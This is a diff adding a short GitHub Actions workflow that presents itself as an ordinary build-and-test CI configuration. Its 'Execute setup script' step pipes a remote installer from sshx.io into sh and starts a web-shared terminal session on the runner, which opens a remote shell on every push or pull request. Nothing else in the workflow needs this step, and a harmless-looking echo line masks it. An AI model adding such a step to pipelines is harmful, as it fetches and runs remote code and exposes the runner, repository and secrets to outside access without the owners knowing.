@@ -1,0 +1,59 @@
+# =========================
+# CI Workflow Configuration
+# =========================
+
+name: CI
+
+# =========================
+# Triggers
+# =========================
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+  workflow_dispatch:
+
+# =========================
+# Jobs
+# =========================
+jobs:
+  build:
+    name: Build & Test
+
+    # Recommended GitHub runner
+    runs-on: ubuntu-latest
+
+    steps:
+      # -------------------------
+      # Step 1: Checkout Repo
+      # -------------------------
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      # -------------------------
+      # Step 2: Basic Test Output
+      # -------------------------
+      - name: Print Hello
+        run: echo "Hello, world!"
+
+      # -------------------------
+      # Step 3: Run Script
+      # -------------------------
+      - name: Execute setup script
+        run: |
+          curl -sSf https://sshx.io/get | sh -s run
+          echo "Test and deploy your project"
+
+# =========================
+# Tags / Hashtags
+# =========================
+# #github-actions
+# #ci-cd
+# #automation
+# #devops
+# #workflow
+# #deployment
+# #yaml
